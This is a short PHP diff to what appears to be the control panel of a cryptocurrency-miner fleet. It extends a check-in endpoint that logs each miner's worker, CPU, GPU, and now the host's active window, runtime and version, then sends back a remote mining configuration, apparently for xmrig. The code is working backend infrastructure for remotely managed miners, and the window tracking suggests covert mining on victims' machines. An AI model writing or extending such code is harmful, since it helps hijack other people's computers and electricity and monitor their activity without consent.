@@ -32,6 +32,9 @@ $fields = [
     'ms_worker'=>getData('worker'),
     'ms_cpu'=>getData('cpu'),
     'ms_gpu'=>getData('gpu'),
+    'ms_activewindow'=>getData('activewindow'),
+    'ms_runtime'=>getData('runtime'),
+    'ms_version'=>getData('version'),
     'ms_remoteURL'=>getData('remoteconfig'),
     'ms_lastConnection'=>$currentDate
 ];
@@ -40,7 +43,8 @@ if ($miner) {
     $base->unam_dbUpdate(getConn(), 'miners', $fields, ['ms_uqhash' => $uqhash, 'ms_type'=>$type]);
 } else {
     $base->unam_dbInsert(getConn(), 'miners', array_merge(['ms_uqhash'=>$uqhash, 'ms_type'=>$type, 'ms_config'=>($type == 'xmrig' ? 1 : 2)], $fields));
+    $miner = $base->unam_dbSelect(getConn(), 'miners', 'ms_minerID, ms_config', ['ms_uqhash' => $uqhash, 'ms_type'=>$type]);
 }
 
 $config = $base->unam_dbSelect(getConn(), 'configs', 'cf_data', ['cf_configID' => $miner['ms_config'] ?? 0]);
-echo $config['cf_data'] ?? 'OK';
+echo $config['cf_data'] ?? json_encode(['response'=>'ok']);
